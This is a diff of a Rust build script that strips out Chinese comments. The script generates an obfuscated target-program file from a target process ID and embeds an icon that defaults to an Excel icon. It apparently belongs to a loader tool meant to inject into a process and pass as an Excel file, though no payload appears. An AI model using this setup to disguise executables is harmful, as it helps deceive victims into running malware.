@@ -4,7 +4,6 @@ include!("src/thunk.rs");
 use std::fs;
 
 fn main() {
-    // 告诉 Cargo 跟踪环境变量的变化
     println!("cargo:rerun-if-env-changed=CARGO_FEATURE_WIN7");
     println!("cargo:rerun-if-env-changed=CARGO_FEATURE_PATTERN1");
     println!("cargo:rerun-if-env-changed=CARGO_FEATURE_PATTERN2");
@@ -13,16 +12,13 @@ fn main() {
     println!("cargo:rerun-if-env-changed=RSL_TARGET_PID");
     println!("cargo:rerun-if-env-changed=RSL_ICON_PATH");
     
-    // 检查 CARGO_FEATURE_WIN7 环境变量，如果存在则启用 Win7 兼容
     if std::env::var("CARGO_FEATURE_WIN7").is_ok() {
         println!("cargo:note=Win7 兼容已启用，执行 thunk");
         thunk();
     }
     
-    // 生成 target.rs 根据pattern feature
     generate_target_rs();
     
-    // 生成 icon.rc
     generate_icon_rc();
     
     embed_resource::compile("icon.rc");
@@ -55,7 +51,6 @@ pub static TARGET_PROGRAM: LazyLock<Vec<u8>> = LazyLock::new(|| obf_lit_bytes!(b
         fs::write(target_path, content).expect("Failed to write target.rs");
         println!("cargo:note=Generated target.rs with TARGET_PID: {}", target_pid);
     } else {
-        // pattern 1 or no pattern, remove target.rs if exists
         if target_path.exists() {
             fs::remove_file(target_path).expect("Failed to remove target.rs");
         }
@@ -67,7 +62,6 @@ fn generate_icon_rc() {
     let icon_path = env::var("RSL_ICON_PATH")
         .unwrap_or_else(|_| "icons/excel.ico".to_string());
     
-    // 将反斜杠替换为正斜杠，以适应RC文件格式
     let icon_path_normalized = icon_path.replace("\\", "/");
     
     let content = format!(r#"iconName ICON "{}""#, icon_path_normalized);
